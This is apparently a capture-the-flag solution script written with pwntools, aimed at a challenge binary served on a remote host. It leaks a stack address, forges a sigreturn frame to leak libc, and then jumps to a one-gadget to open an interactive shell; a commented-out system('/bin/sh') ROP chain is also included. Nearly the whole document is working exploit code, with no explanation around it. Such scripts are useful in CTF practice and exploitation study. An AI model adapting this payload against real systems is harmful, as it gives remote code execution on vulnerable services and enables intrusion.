from pwn import*
context.log_level ='DEBUG'
syscall_ret = 0x400517
mov_rax_F = 0x4004DA
pop_rdi_ret= 0x4005A3
main = 0x40051D
p = process('./main')
p = remote('node3.buuoj.cn',26817)
elf = ELF('./main',checksec=False)
libc = ELF('./libc-2.27.so',checksec=False)
payload_I = '\x00'*0x10 + p64(main)

p.send(payload_I)
p.recvuntil(p64(0x400536))
stack = u64(p.recv(6).ljust(8,'\x00'))
log.info('Stack:\t' + hex(stack))
#------------------------
fake_frame  = p64(0) * 12
fake_frame += p64(1)							# RDI = RAX
fake_frame += p64(0x601018)						# RSI
fake_frame += p64(0)							# RBP
fake_frame += p64(0)							# RBX
fake_frame += p64(0x100)						# RDX
fake_frame += p64(1)							# RAX
fake_frame += p64(0)							# RCX
fake_frame += p64(stack - 0x20)					# RSP
fake_frame += p64(syscall_ret)					# RIP
fake_frame += p64(0)							# eflags
fake_frame += p64(0x33)							# cs : gs : fs
fake_frame += p64(0) * 7

payload_II  = '\x00'*0x10 + p64(mov_rax_F)  + p64(syscall_ret) + p64(0) + fake_frame
payload_II += p64(main)
p.send(payload_II)
libc_base =u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))
binsh = libc_base + libc.search('/bin/sh').next()
system = libc_base + libc.sym['system']
rce = libc_base + 0x4F322
#------------------------
#p.send('\x00'*0x10 + p64(pop_rdi_ret) + p64(binsh) + p64(system))
p.send('\x00'*0x10 + p64(rce))
p.interactive()
